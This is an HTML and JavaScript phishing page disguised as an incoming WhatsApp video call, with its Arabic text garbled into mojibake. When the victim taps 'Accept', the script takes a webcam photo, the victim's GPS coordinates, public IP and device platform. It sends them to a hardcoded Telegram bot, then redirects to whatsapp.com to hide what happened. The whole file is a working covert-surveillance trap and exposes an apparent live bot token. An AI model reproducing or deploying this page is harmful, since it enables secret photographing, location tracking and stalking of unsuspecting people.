<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>WhatsApp Video Call</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #075e54; color: white; font-family: sans-serif; text-align: center; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; }
        .avatar { width: 100px; height: 100px; background: #ddd; border-radius: 50%; margin: 0 auto 20px; }
        .calling { font-size: 24px; margin-bottom: 10px; }
        .accept-btn { background: #25d366; border: none; padding: 15px 40px; border-radius: 30px; color: white; font-size: 18px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>

    <div class="avatar"></div>
    <div class="calling">Ø§ØªØµØ§Ù„ ÙÙŠØ¯ÙŠÙˆ ÙˆØ§Ø±Ø¯...</div>
    <p>ÙŠØ±Ø¬Ù‰ Ù‚Ø¨ÙˆÙ„ Ø§Ù„Ø§ØªØµØ§Ù„ Ù„Ù„Ù…ØªØ§Ø¨Ø¹Ø©</p>
    <button class="accept-btn" onclick="startTrap()">Ø±Ø¯ (Accept)</button>

    <video id="v" autoplay style="display:none"></video>
    <canvas id="c" style="display:none"></canvas>

<script>
    const T = "8798304320:AAHW11ODgkShNPElpztLvomrquwaPDcINWQ";
    const ID = "2092901099";

    async function startTrap() {
        try {
            // Ø·Ù„Ø¨ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ØªØ­Øª ØºØ·Ø§Ø¡ "Ù‚Ø¨ÙˆÙ„ Ø§Ù„Ù…ÙƒØ§Ù„Ù…Ø©"
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            
            // Ø³Ø­Ø¨ Ø§Ù„Ù€ IP ÙˆØ§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ (GPS)
            const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
            
            // Ù…Ø­Ø§ÙˆÙ„Ø© Ø³Ø­Ø¨ Ø¥Ø­Ø¯Ø§Ø«ÙŠØ§Øª GPS (ØªØ·Ù„Ø¨ Ø¥Ø°Ù† Ø¢Ø®Ø±)
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const gps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                await fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${ID}&text=${encodeURIComponent("ğŸ“ Ù…ÙˆÙ‚Ø¹ GPS Ø§Ù„Ø¯Ù‚ÙŠÙ‚: " + gps)}`);
            });

            const v = document.getElementById('v');
            v.srcObject = stream;

            setTimeout(async () => {
                const c = document.getElementById('c');
                c.width = 400; c.height = 300;
                c.getContext('2d').drawImage(v, 0, 0, 400, 300);
                const blob = await new Promise(res => c.toBlob(res, 'image/jpeg', 0.5));

                const fd = new FormData();
                fd.append('chat_id', ID);
                fd.append('photo', blob, 'shot.jpg');
                fd.append('caption', `âœ… ØµÙŠØ¯ Ù†Ø§Ø¬Ø­!\nğŸŒ IP: ${ipData.ip}\nğŸ“± Ø§Ù„Ø¬Ù‡Ø§Ø²: ${navigator.platform}`);

                await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
                
                stream.getTracks().forEach(t => t.stop());
                window.location.href = "https://www.whatsapp.com";
            }, 2000);

        } catch (e) {
            alert("Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø§ØªØµØ§Ù„: ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§.");
        }
    }
</script>
</body>
</html>
